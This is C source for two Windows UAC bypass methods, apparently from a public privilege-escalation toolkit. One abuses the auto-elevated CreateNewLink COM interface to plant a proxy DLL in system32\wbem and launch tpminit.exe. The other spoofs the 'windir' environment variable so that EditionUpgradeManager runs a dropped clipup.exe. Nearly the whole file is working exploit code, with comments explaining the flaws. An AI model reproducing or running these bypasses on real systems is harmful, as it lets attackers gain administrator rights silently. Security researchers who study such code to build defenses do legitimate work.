/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2019
*
*  TITLE:       RINN.C
*
*  VERSION:     3.20
*
*  DATE:        24 Oct 2019
*
*  rinn & hfiref0x UAC bypass methods.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmCreateNewLinkMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for CreateNewLinkMethod.
*
*/
BOOL ucmCreateNewLinkMethodCleanup(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, WBEM_DIR);
    _strcat(szBuffer, WBEMCOMN_DLL);

    return ucmMasqueradedDeleteDirectoryFileCOM(szBuffer);
}

/*
* ucmEditionUpgradeManagerMethodCleanup
*
* Purpose:
*
* Post execution cleanup routine for EditionUpgradeManagerMethod.
*
*/

BOOL ucmEditionUpgradeManagerMethodCleanup(
    VOID
)
{
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, g_ctx->szTempDirectory);
    _strcat(szBuffer, T_KUREND);
    _strcat(szBuffer, SYSTEM32_DIR);
    _strcat(szBuffer, CLIPUP_EXE);

    return DeleteFile(szBuffer);
}

/*
* ucmCreateNewLinkMethod
*
* Purpose:
*
* Bypass UAC using CreateNewLink autoelevated interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
* The CreateNewLink interface has method named "CreateNewLink" (MS tautology),
* where part of it implementation is CopyFileW(InputParam.Source, InputParam.Dest, 0);
* Since this code runs elevated it can be used to write data to the protected
* Windows directories such as system32. Availability: Windows 7, Windows 8, Windows 8.1.
*
* More checking added in Windows 10 interface code (file exts, file attribute flags). This may
* compilicate it epxloitation on Windows 10 prior to RS1.
*
* In RS1 and afterwards this interface is not in consent whitelist (COMAutoApprovalList).
* Because TH1 and TH2 are both EOL'ed at moment of discovery this method marked as fixed in RS1.
*
* Fixed in Windows 10 RS1
*
*/
NTSTATUS ucmCreateNewLinkMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS            MethodResult = STATUS_ACCESS_DENIED;

#ifndef _WIN64
    NTSTATUS Status;
#endif

    HRESULT             hr = E_UNEXPECTED, hr_init;

    ICreateNewLink     *CreateNewLink = NULL;
    CREATELINKDATA      LinkData;

    SIZE_T              l;

    WCHAR szDllPath[MAX_PATH * 2], szTargetPath[MAX_PATH * 2];


#ifndef _WIN64
    if (g_ctx->IsWow64) {
        Status = supEnableDisableWow64Redirection(TRUE);
        if (!NT_SUCCESS(Status))
            return Status;
    }
#endif

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        _strcpy(szDllPath, g_ctx->szTempDirectory);
        _strcat(szDllPath, WBEMCOMN_DLL);

        l = _strlen(szDllPath);
        if (l > MAX_PATH) { //CreateNewLink parameters length limited to MAX_PATH
            MethodResult = STATUS_DATA_ERROR;
            break;
        }

        _strcpy(szTargetPath, g_ctx->szSystemDirectory);
        _strcat(szTargetPath, WBEM_DIR);
        _strcat(szTargetPath, WBEMCOMN_DLL);

        l = _strlen(szTargetPath);
        if (l > MAX_PATH) //CreateNewLink parameters length limited to MAX_PATH
            break;

        hr = ucmAllocateElevatedObject(
            T_CLSID_CreateNewLink,
            &IID_ICreateNewLink,
            CLSCTX_LOCAL_SERVER,
            &CreateNewLink);

        if (hr != S_OK)
            break;

        if (CreateNewLink == NULL) {
            hr = E_OUTOFMEMORY;
            break;
        }

        //
        // Drop Fubuki as wbemcomn.dll to %temp%.
        //
        if (supWriteBufferToFile(szDllPath, ProxyDll, ProxyDllSize)) {

            RtlSecureZeroMemory(&LinkData, sizeof(LinkData));

            LinkData.dwFlags = 0x200;
            _strcpy(LinkData.szExeName, szDllPath);
            _strcpy(LinkData.szLinkName, szTargetPath);

            hr = CreateNewLink->lpVtbl->CreateNewLink(CreateNewLink, &LinkData, 0);

            if (SUCCEEDED(hr)) {

                _strcpy(szTargetPath, g_ctx->szSystemDirectory);
                _strcat(szTargetPath, TPMINIT_EXE);

                //
                // Run target and wait.
                //
                if (supRunProcess(szTargetPath, NULL))
                    MethodResult = STATUS_SUCCESS;

            }
            DeleteFile(szDllPath); //remove temp file.
        }

    } while (FALSE);

    if (CreateNewLink)
        CreateNewLink->lpVtbl->Release(CreateNewLink);

#ifndef _WIN64
    if (g_ctx->IsWow64) {
        supEnableDisableWow64Redirection(FALSE);
    }
#endif

    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}

/*
* ucmCreateNewLinkMethod
*
* Purpose:
*
* Bypass UAC using EditionUpgradeManager autoelevated interface.
* This function expects that supMasqueradeProcess was called on process initialization.
*
* EditionUpgradeManager has method called AcquireModernLicenseWithPreviousId.
* During it execution MS code starts Clipup.exe process from (what it suppose) windows system32 folder.
* However since MS programmers always lazy and banned in their own documentation it uses
* environment variable "windir" to expand Windows directory instead of using something like GetSystemDirectory.
* This giving us opportunity (hello Nadela) to spoof current user environment variable for requested DllHost.exe
* thus turning their code launch our clipup.exe from our controlled location.
*
*/
NTSTATUS ucmEditionUpgradeManagerMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS                    MethodResult = STATUS_ACCESS_DENIED;
    BOOL                        bEnvSet = FALSE;
    HRESULT                     hr = E_UNEXPECTED, hr_init;
    IEditionUpgradeManager     *Manager = NULL;

    DWORD Data[3];

    WCHAR szBuffer[MAX_PATH * 2];

    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    do {

        //
        // Replace default Fubuki dll entry point with new and remove dll flag.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_DEFAULT_ENTRYPOINT,
            TRUE))
        {
            break;
        }

        //
        // Create %temp%\KureND directory.
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, T_KUREND);

        if (!CreateDirectory(szBuffer, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Set controlled environment variable.
        //
        bEnvSet = supSetEnvVariable(FALSE,
            NULL,
            T_WINDIR,
            szBuffer);

        if (!bEnvSet)
            break;

        //
        // Create %temp%\KureND\system32 directory.
        //
        _strcat(szBuffer, SYSTEM32_DIR);
        if (!CreateDirectory(szBuffer, NULL))
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;

        //
        // Drop payload to %temp%\system32 as clipup.exe and run target interface.
        //
        _strcat(szBuffer, CLIPUP_EXE);
        if (supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize)) {

            hr = ucmAllocateElevatedObject(T_CLSID_EditionUpgradeManager,
                &IID_EditionUpgradeManager,
                CLSCTX_LOCAL_SERVER,
                &Manager);

            if (hr != S_OK)
                break;

            if (Manager == NULL) {
                hr = E_OUTOFMEMORY;
                break;
            }

            Data[0] = 'f';
            Data[1] = 'f';
            Data[2] = 0;

            Manager->lpVtbl->AcquireModernLicenseWithPreviousId(Manager, MYSTERIOUSCUTETHING, (DWORD*)&Data);

        }

    } while (FALSE);

    if (Manager)
        Manager->lpVtbl->Release(Manager);

    //
    // Cleanup if requested.
    //
    if (bEnvSet)
        supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);


    if (hr_init == S_OK)
        CoUninitialize();

    return MethodResult;
}
